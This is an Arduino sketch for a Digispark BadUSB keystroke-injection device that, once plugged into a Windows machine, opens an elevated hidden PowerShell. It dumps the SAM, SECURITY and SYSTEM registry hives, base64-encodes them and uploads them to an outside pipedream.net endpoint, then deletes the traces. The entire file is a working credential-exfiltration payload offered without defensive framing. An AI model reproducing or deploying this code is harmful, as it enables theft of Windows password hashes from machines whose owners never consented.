#include "DigiKeyboardFr.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(3000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.println("taskmgr"); //starting taskmgr
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboardFr.sendKeyStroke(KEY_N);//run
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboardFr.sendKeyStroke(KEY_TAB); 
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboardFr.println("cd $env:temp"); //going to temporary dir
  DigiKeyboardFr.delay(300);  
  DigiKeyboardFr.println(F("PowerShell.exe -windowstyle hidden {reg save HKLM\\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\\security SE.B; certutil -encode -f SE.B SE.B; reg save HKLM\\system SY.B; certutil -encode -f SY.B SY.B;$U='https://en2957avwejfe.x.pipedream.net/';Invoke-WebRequest -Uri $U -Method POST -Infile SA.B;Invoke-WebRequest -Uri $U -Method POST -Infile SE.B;Invoke-WebRequest -Uri $U -Method POST -Infile SY.B;del *.B;exit}")); //This is where all the magic happens
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.delay(200);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboardFr.delay(900000);
  digitalWrite(1, LOW); 
  DigiKeyboardFr.delay(5000);
}
